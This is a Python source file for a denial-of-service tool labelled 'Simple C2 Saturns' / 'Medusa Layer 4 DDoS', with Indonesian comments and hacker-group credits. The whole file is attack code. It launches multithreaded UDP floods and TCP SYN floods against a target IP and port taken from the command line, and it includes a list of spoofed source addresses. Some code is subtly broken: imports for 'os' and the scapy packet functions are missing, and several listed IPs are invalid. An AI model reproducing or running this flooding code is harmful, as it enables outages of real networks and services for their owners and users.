import socket
import threading
import random
import time
import sys
from colorama import Fore, init

# Inisialisasi colorama
init(autoreset=True)

# Banner
logo = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
              Simple C2 Saturns
                   V : 1.2
              MADE BY : MrSanZz
             TEAM  : JogjaXploit
"""
print(Fore.LIGHTMAGENTA_EX + logo)

# Fungsi untuk membersihkan layar
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Daftar IP palsu untuk spoofing
fake_ips = [
    '192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5',
    '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4',
    '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4',
    '192.165.6.9', '188.1545.54.3'
]

# Fungsi serangan UDP (diambil dari MedusaL4)
def udp_flood(ip, port, packet, times):
    timeout = time.time() + times
    data = random._urandom(1024)  # Generate random data once
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        print(f"\x1b[31m[\x1b[33mUDP Flood\x1b[31m] \x1b[0mAttacking... \x1b[31m>  \x1b[0mtime \x1b[32m{times} \x1b[0mip \x1b[32m{ip}\x1b[31m:\x1b[32m{port}\x1b[0m packet \x1b[32m{packet}\x1b[0m")
        while time.time() < timeout:
            try:
                for _ in range(packet):
                    s.sendto(data, (ip, port))  # Send data to target
            except Exception as e:
                print(f"\x1b[31m[\x1b[33mUDP Flood\x1b[31m] \x1b[0mError: {e}")
                break  # Exit the loop on error

    print("\x1b[31m[\x1b[33mUDP Flood\x1b[31m] > \x1b[0mSuccessfully Attacked!")

# Fungsi serangan TCP SYN Flood (diambil dari script sebelumnya)
def tcp_syn_flood(ip, port, packet, times):
    timeout = time.time() + times
    print(f"\x1b[31m[\x1b[33mTCP SYN Flood\x1b[31m] \x1b[0mAttacking... \x1b[31m>  \x1b[0mtime \x1b[32m{times} \x1b[0mip \x1b[32m{ip}\x1b[31m:\x1b[32m{port}\x1b[0m packet \x1b[32m{packet}\x1b[0m")
    while time.time() < timeout:
        try:
            syn_packet = IP(dst=ip) / TCP(sport=RandShort(), dport=port, flags="S")
            raw_packet = Raw(b"X" * packet)
            full_packet = syn_packet / raw_packet
            send(full_packet, loop=1, verbose=0)
        except Exception as e:
            print(f"\x1b[31m[\x1b[33mTCP SYN Flood\x1b[31m] \x1b[0mError: {e}")
            break

    print("\x1b[31m[\x1b[33mTCP SYN Flood\x1b[31m] > \x1b[0mSuccessfully Attacked!")

# Main program
def main():
    if len(sys.argv) < 6:
        print("""\033[0m
\033[0m           █▀▄▀█ █▀▀ █▀▀▄ █──█ █▀▀ █▀▀█ \033[31m █▀▀▄ █▀▀▄ █▀▀█ █▀▀ 
\033[0m           █─▀─█ █▀▀ █──█ █──█ ▀▀█ █▄▄█ \033[31m █──█ █──█ █──█ ▀▀█ 
\033[0m           ▀───▀ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ \033[31m ▀▀▀─ ▀▀▀─ ▀▀▀▀ ▀▀▀ V1.2.0    
\033[33m       ╚═════════╦══════════════════════════════════╦═════════╝
\033[33m       ╔═════════╩══════════════════════════════════╩═════════╗
\033[33m       ║            Welcome To \033[31mMedusa Layer 4 DDoS            \033[33m║
\033[33m       ║      \x1b[38;2;255;20;147m►► \033[0mThis tool for Layer 4 Attack \033[31m(\033[0mUDP \033[31m& \033[0mTCP\033[31m)     \033[33m║
\033[33m       ║           Telegram \x1b[38;2;255;20;147m: \033[32mhttps://t.me/RipperSec          \033[33m║
\033[33m       ║                 Developer \x1b[38;2;255;20;147m: \033[0mTrashDono                \033[33m║
\033[33m       ╚══════════════════════════════════════════════════════╝
\033[0m""")
        sys.exit("\x1b[38;2;255;20;147m►► \033[0mUsage\x1b[38;2;255;20;147m: \033[0mpython3 \033[33mMedusaL4 \033[0m<\033[32mtimes\033[0m> <\033[32mip\033[0m> <\033[32mport\033[0m> <\033[32mpacket\033[0m> <\033[32mthreads\033[0m>")

    # Read command line arguments
    times = float(sys.argv[1])
    ip = str(sys.argv[2])
    port = int(sys.argv[3])
    packet = int(sys.argv[4])
    threads = int(sys.argv[5])

    print("\x1b[31m[\x1b[33mMedusaL4\x1b[31m] \x1b[0mEngine Started!")

    # Mulai serangan dengan multi-threading
    for _ in range(threads):
        thread_udp = threading.Thread(target=udp_flood, args=(ip, port, packet, times))
        thread_tcp = threading.Thread(target=tcp_syn_flood, args=(ip, port, packet, times))
        thread_udp.start()
        thread_tcp.start()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\x1b[31m[\x1b[33mMedusaL4\x1b[31m] \x1b[0mEngine Stopped!')
        sys.exit()